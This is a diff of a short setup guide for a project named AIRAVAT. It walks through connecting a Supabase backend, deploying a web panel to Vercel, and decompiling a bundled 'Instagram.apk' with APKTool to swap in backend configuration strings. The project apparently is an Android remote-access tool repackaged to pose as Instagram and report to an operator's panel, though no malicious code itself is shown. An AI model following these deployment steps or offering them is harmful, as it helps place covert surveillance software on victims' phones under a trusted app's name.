@@ -20,14 +20,24 @@ This is a quick setup guide for getting AIRAVAT running with Supabase. For detai
 4. Verify tables are created in Table Editor
 
 ### Step 3: Web Panel Setup
+
 Run the automated setup script:
+
 ```bash
 cd AIRAVAT
 chmod +x deploy.sh
 ./deploy.sh
 ```
 
+Or for direct Vercel deployment (if already configured):
+
+```bash
+chmod +x deploy-vercel.sh
+./deploy-vercel.sh
+```
+
 Or manually update `WEB PANEL/index.html`:
+
 ```javascript
 const supabaseConfig = {
   url: "https://your-project-id.supabase.co",  // Your Project URL
@@ -36,12 +46,14 @@ const supabaseConfig = {
 ```
 
 ### Step 4: Deploy to Vercel
+
 1. Install Vercel CLI: `npm install -g vercel`
 2. Login: `vercel login`
 3. Deploy: `vercel --prod`
 4. Your panel is now live at the provided URL!
 
 ### Step 5: Android APK Setup
+
 1. Decompile `ANDROID APP/Instagram.apk` using APKTool
 2. Replace `res/values/strings.xml` with content from `ANDROID APP/supabase_strings.xml`
 3. Update the Supabase configuration values
@@ -66,6 +78,7 @@ const supabaseConfig = {
 ## 📚 Full Documentation
 
 For detailed step-by-step instructions with screenshots and troubleshooting, see:
+
 - [MIGRATION_GUIDE.md](MIGRATION_GUIDE.md) - Complete migration guide
 - [README.md](README.md) - Full project documentation
 
